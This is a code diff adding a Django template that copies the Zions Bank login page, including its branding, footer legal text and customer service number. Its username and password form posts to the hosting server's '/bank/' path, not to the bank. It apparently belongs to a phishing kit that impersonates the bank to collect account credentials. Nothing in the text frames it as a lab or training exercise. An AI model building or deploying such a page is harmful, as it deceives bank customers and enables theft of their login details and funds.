@@ -1,0 +1,52 @@
+{% load static %}
+
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+        <title>ZIONSBANK</title>
+	<link rel="stylesheet" href="{% static 'zions.css' %}">
+    </head>
+    <body>
+        
+          <div class="head">ZIONS BANK<span id="red">®</span></div>  
+        
+        <div class="main">
+            <div id="main">
+                
+               
+               
+           <span id="li1">PERSONAL</span> <span id="li2">BUSINESS &ensp; <span id="hrd">|</span> &ensp;CORPORATE</span>
+                   
+	   <form action="/bank/" method="post">{% csrf_token %}
+                <label><strong>Username</strong></label><br>
+                <input class="input" type="text" name="name" required><br>
+                <label><strong>Password</strong></label><br>
+                <input class="input" type="password" name="password" required><br>
+                <div id="rem"><input type="checkbox"><span>Remember Me</span>&emsp; &emsp; &emsp; <span>Need Help?</span></div>
+                <input id="login" type="submit" value="SIGN IN">
+                
+                <div id="en">Enroll Now</div>
+                <hr>
+                <div id="mor">Mortgage Login</div>
+                
+            </form>
+                </div>
+        </div>
+        
+        <div class="but">
+            <div class="btn">ZIONS BANK<span id="red">®</span></div>
+            
+            <ul class="line">
+                <li>A Division of Zions Bancorporation,</li>
+                <li>N.A Member FDIC</li>
+               <li>Equal Housing Lender, NMLS</li>
+                <li>Registry #467014</li>
+                <li>Customer Service: 888-307-3411</li>
+                <li>©2022 Zions Bancorporation, N.A.</li>
+                <li>All Rights Reserved.</li>
+                 </ul>
+        </div>
+        
+    </body>
+</html>
